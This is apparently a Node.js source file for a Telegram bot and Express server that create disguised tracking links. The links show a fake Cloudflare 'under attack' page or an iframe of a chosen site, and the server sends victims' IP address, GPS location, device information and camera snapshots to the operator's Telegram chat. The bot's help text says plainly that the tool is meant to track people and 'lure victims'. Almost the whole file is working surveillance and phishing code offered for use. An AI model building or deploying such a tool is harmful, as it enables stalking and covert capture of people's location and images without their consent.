const fs = require("fs");
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const TelegramBot = require("node-telegram-bot-api");

const bot = new TelegramBot(process.env["bot"], { polling: true });
const app = express();

// Middleware configuration
app.use(bodyParser.json({ limit: "20mb", type: "application/json" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "20mb", type: "application/x-www-form-urlencoded" }));
app.use(cors());
app.set("view engine", "ejs");

// Constants
const hostURL = "YOUR URL";
const use1pt = false;

// Helper function to get client IP address
const getClientIp = (req) => {
  if (req.headers['x-forwarded-for']) {
    return req.headers['x-forwarded-for'].split(",")[0];
  }
  return req.connection?.remoteAddress || req.ip;
};

// Routes
app.get("/w/:path/:uri", (req, res) => {
  const ip = getClientIp(req);
  const time = new Date().toISOString().slice(0, 19).replace('T', ' ');

  if (req.params.path) {
    res.render("webview", { ip, time, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("error");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = getClientIp(req);
  const time = new Date().toISOString().slice(0, 19).replace('T', ' ');

  if (req.params.path) {
    res.render("cloudflare", { ip, time, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("error");
  }
});

app.get("/", (req, res) => {
  const ip = getClientIp(req);
  res.json({ ip });
});

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat));
  const lon = parseFloat(decodeURIComponent(req.body.lon));
  const uid = decodeURIComponent(req.body.uid);
  const acc = decodeURIComponent(req.body.acc);

  if (lat && lon && uid && acc) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});

app.post("/", (req, res) => {
  const uid = decodeURIComponent(req.body.uid);
  const data = decodeURIComponent(req.body.data)?.replaceAll("<br>", "\n");

  if (uid && data) {
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});

app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid);
  const img = decodeURIComponent(req.body.img);

  if (uid && img) {
    const buffer = Buffer.from(img, 'base64');
    const info = { filename: "camsnap.png", contentType: 'image/png' };

    bot.sendPhoto(parseInt(uid, 36), buffer, {}, info)
      .then(() => res.send("Done"))
      .catch((error) => {
        console.error(error);
        res.status(500).send("Error sending photo");
      });
  } else {
    res.status(400).send("Invalid data");
  }
});

// Telegram bot handlers
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    await createLink(chatId, msg.text);
  } else if (msg.text === "/start") {
    const welcomeMessage = `Welcome ${msg.chat.first_name}! 
You can use this bot to track down people just through a simple link.
It can gather information like location, device info, and camera snaps.
Type /help for more info.`;
    bot.sendMessage(chatId, welcomeMessage, {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
    });
  } else if (msg.text === "/create") {
    createNew(chatId);
  } else if (msg.text === "/help") {
    const helpMessage = `Through this bot, you can track people just by sending a simple link.
Send /create to begin. Afterwards, it will ask you for a URL to be used in an iframe to lure victims.
After receiving the URL, it will send you two links which you can use to track people.

Specifications:
1. Cloudflare Link: This method shows a Cloudflare "under attack" page to gather information, then redirects the victim to the destination URL.
2. Webview Link: This shows a website (e.g., Bing, dating sites) using an iframe for gathering information.
(⚠️ Many sites may not work under this method if they have x-frame headers present. e.g., https://google.com)

The project is OSS at: sorry link broken`;
    bot.sendMessage(chatId, helpMessage);
  }
});

bot.on('callback_query', async (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data === "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on('polling_error', (error) => {
  console.error(error);
});

// Helper functions
async function createLink(cid, msg) {
  const isEncoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if (msg.toLowerCase().includes('http') && !isEncoded) {
    const url = `${cid.toString(36)}/${btoa(msg)}`;
    const cloudflareUrl = `${hostURL}/c/${url}`;
    const webviewUrl = `${hostURL}/w/${url}`;

    let cUrl = cloudflareUrl;
    let wUrl = webviewUrl;

    if (use1pt) {
      const shortenerApi = "https://short-link-api.vercel.app/?query=";
      const cShortened = await fetch(`${shortenerApi}${encodeURIComponent(cloudflareUrl)}`).then(res => res.json());
      const wShortened = await fetch(`${shortenerApi}${encodeURIComponent(webviewUrl)}`).then(res => res.json());

      cUrl = Object.values(cShortened).join("\n");
      wUrl = Object.values(wShortened).join("\n");
    }

    const message = `New links have been created successfully.
URL: ${msg}

✅ Your Links
🌐 CloudFlare Page Link
${cUrl}

🌐 WebView Page Link
${wUrl}`;

    bot.sendMessage(cid, message, {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
      })
    });
  } else {
    bot.sendMessage(cid, "⚠️ Please enter a valid URL, including http or https.");
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, "🌐 Enter Your URL", {
    reply_markup: JSON.stringify({ "force_reply": true })
  });
}

// Start the server
const PORT = 5000;
app.listen(PORT, () => {
  console.log(`App running on port ${PORT}!`);
});
